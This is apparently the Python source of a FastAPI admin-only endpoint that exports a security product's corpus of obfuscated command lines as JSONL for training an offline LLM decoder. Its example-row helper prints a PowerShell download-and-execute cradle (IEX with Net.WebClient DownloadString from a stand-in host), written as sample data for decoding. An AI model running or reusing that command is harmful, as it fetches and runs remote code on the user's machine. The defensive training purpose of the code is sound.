"""training_export — READ-ONLY corpus export in third-party JSONL schemas.

Feb-2026 addition. Wraps the EXISTING `training.seed_dataset` corpus and
projects each record into the schema described in the analyst-supplied
"Train your offline LLM" playbook — WITHOUT touching any existing file
under `/app/backend/training/`.

This module is deliberately conservative:
  • Read-only. No writes to disk, no mutation of the seed dataset.
  • Admin-only. Non-admins get 403.
  • Streaming response. Never materialises the full corpus in memory.
  • Emits a NEW file name (`corpus.doc-schema.jsonl`) — the existing
    corpus files (`samples.jsonl`, `negative_samples.jsonl`) are left
    untouched.
  • The doc's schema is one of several output formats (default). Falls
    back cleanly if the analyst asks for the native NivXRay schema.

The route lives under `/api/training/export/*` behind the same JWT auth
guard as the rest of the admin surface (see `deps.py::require_admin`).
"""
from __future__ import annotations

import json
from typing import Iterator, List

from fastapi import APIRouter, Depends, HTTPException, Query
from fastapi.responses import StreamingResponse

from deps import require_admin

router = APIRouter(prefix="/api/training/export", tags=["training-export"])


# ── Schema projectors ────────────────────────────────────────────────
# Each projector is a small pure function `TrainingRecord -> dict` that
# emits the row shape a particular downstream tool expects.

def _doc_schema_row(rec) -> dict:
    """Doc-supplied "algorithm_chain / decoded_output" schema.

    Each row is:
        {"instruction": "...", "input": "...", "output": "<JSON-encoded>"}

    where `output` is a JSON string carrying:
        {"algorithm_chain": "<engine chain>", "decoded_output": "<plaintext>"}

    Matches the exact structure from the doc so a downstream QLoRA /
    Unsloth training script can consume it without any glue code.
    """
    # `predicted_process_tree.rationale` (if present) gives us the SOC
    # reasoning. `tags` are our best proxy for algorithm-chain names when
    # the record's category doesn't include a chain hint.
    tree = getattr(rec, "predicted_process_tree", None)
    algo_chain = (
        (getattr(rec, "category", "") or "").replace("_", " → ")
        or " → ".join(getattr(rec, "tags", []) or [])
        or "unknown"
    )
    decoded = getattr(rec, "decoded_script_analysis", "") or ""
    output_obj = {
        "algorithm_chain": algo_chain,
        "decoded_output":  decoded,
    }
    return {
        "instruction": "Decode the following obfuscated command line.",
        "input":       getattr(rec, "input_raw_command", "") or "",
        "output":      json.dumps(output_obj, ensure_ascii=False),
    }


def _native_schema_row(rec) -> dict:
    """Native NivXRay schema — full TrainingRecord as a dict."""
    return rec.model_dump()


PROJECTORS = {
    "doc-schema": _doc_schema_row,
    "native":     _native_schema_row,
}


# ── Corpus source (read-only, cached at first hit) ───────────────────
_CORPUS_CACHE: List = []


def _load_corpus() -> List:
    """Import the seed dataset lazily so this router never side-effects
    at startup if the caller doesn't use it."""
    global _CORPUS_CACHE
    if _CORPUS_CACHE:
        return _CORPUS_CACHE
    try:
        from training.seed_dataset import _ARCHES  # existing corpus list
        _CORPUS_CACHE = list(_ARCHES)   # shallow copy — never mutate _ARCHES
    except Exception:
        _CORPUS_CACHE = []
    return _CORPUS_CACHE


def _stream_jsonl(schema: str, limit: int | None) -> Iterator[bytes]:
    projector = PROJECTORS[schema]
    for i, rec in enumerate(_load_corpus()):
        if limit is not None and i >= limit:
            return
        try:
            row = projector(rec)
            yield (json.dumps(row, ensure_ascii=False) + "\n").encode("utf-8")
        except Exception:
            # Skip rows the projector can't render — never break the stream.
            continue


# ── Endpoints ────────────────────────────────────────────────────────
@router.get("/schemas")
def list_schemas(_admin=Depends(require_admin)):
    """List available output schemas + a one-line description each."""
    return {
        "schemas": [
            {"id": "doc-schema",
             "description": "{instruction, input, output:JSON(algorithm_chain, decoded_output)} — "
                            "matches the Feb-2026 offline-LLM training playbook.",
             "example_row": _doc_schema_row_example()},
            {"id": "native",
             "description": "Full NivXRay TrainingRecord — process tree, evidence, rationale, "
                            "tags, difficulty. For training against our own MoE panel schema.",
             "example_row": {"training_id": "…", "platform": "windows",
                             "category": "…", "input_raw_command": "…", "…": "…"}},
        ]
    }


@router.get("/corpus.jsonl")
def export_corpus(
    schema: str = Query("doc-schema", pattern="^(doc-schema|native)$"),
    limit:  int | None = Query(None, ge=1, le=100_000),
    _admin=Depends(require_admin),
):
    """Stream the corpus in the requested schema as JSONL.

    Query params
      - schema: `doc-schema` (default) or `native`.
      - limit:  optional row cap (1..100 000).
    """
    if schema not in PROJECTORS:
        raise HTTPException(status_code=400, detail=f"Unknown schema: {schema}")
    fname = f"nivxray-corpus.{schema}.jsonl"
    return StreamingResponse(
        _stream_jsonl(schema, limit),
        media_type="application/x-ndjson",
        headers={"Content-Disposition": f'attachment; filename="{fname}"'},
    )


@router.get("/stats")
def corpus_stats(_admin=Depends(require_admin)):
    """Cheap read-only stats for a UI download page (never touches disk)."""
    corpus = _load_corpus()
    by_platform: dict = {}
    by_category: dict = {}
    by_difficulty: dict = {}
    for rec in corpus:
        by_platform[getattr(rec, "platform", "?")] = by_platform.get(getattr(rec, "platform", "?"), 0) + 1
        by_category[getattr(rec, "category", "?")] = by_category.get(getattr(rec, "category", "?"), 0) + 1
        by_difficulty[getattr(rec, "difficulty", "?")] = by_difficulty.get(getattr(rec, "difficulty", "?"), 0) + 1
    return {
        "total_records": len(corpus),
        "by_platform":   by_platform,
        "by_category":   by_category,
        "by_difficulty": by_difficulty,
        "schemas_available": list(PROJECTORS.keys()),
    }


# ── Helpers ──────────────────────────────────────────────────────────
def _doc_schema_row_example() -> dict:
    return {
        "instruction": "Decode the following obfuscated command line.",
        "input":       "powershell.exe -Enc SQBFAFgAIAAo…",
        "output":      json.dumps({
            "algorithm_chain": "PowerShell → -EncodedCommand → base64 → UTF-16LE",
            "decoded_output":  "IEX (New-Object Net.WebClient).DownloadString('http://x/y.ps1')",
        }, ensure_ascii=False),
    }
